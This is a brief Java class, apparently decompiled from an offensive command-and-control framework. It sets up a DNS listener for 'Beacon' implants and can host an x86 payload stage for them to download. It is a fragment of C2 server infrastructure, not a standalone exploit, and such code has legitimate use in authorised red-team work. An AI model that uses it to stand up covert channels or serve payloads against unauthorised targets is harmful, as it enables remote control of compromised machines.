package beacon.c2setup;

import beacon.BeaconC2;
import beacon.BeaconDNS;
import common.ScListener;
import dns.DNSServer;
import server.Resources;

public class BeaconSetupDNS extends BeaconSetupC2 {
   protected int port = 0;
   protected BeaconDNS handler = null;
   protected DNSServer server;

   public BeaconSetupDNS(Resources var1, ScListener var2, BeaconC2 var3) {
      super(var1, var2, var3);
      this.port = var2.getBindPort();
   }

   public void start() throws Exception {
      this.handler = new BeaconDNS(this.getListener(), this.getProfile(), this.getController());
      if (this.getProfile().option(".host_stage")) {
         this.handler.setPayloadStage(this.listener.export("x86"));
      }

      this.server = new DNSServer(this.listener.getBindPort());
      this.server.setDefaultTTL(this.getProfile().getInt(".dns_ttl"));
      this.server.installHandler(this.handler);
      this.server.go();
   }

   public void stop() {
      this.server.stop();
   }
}
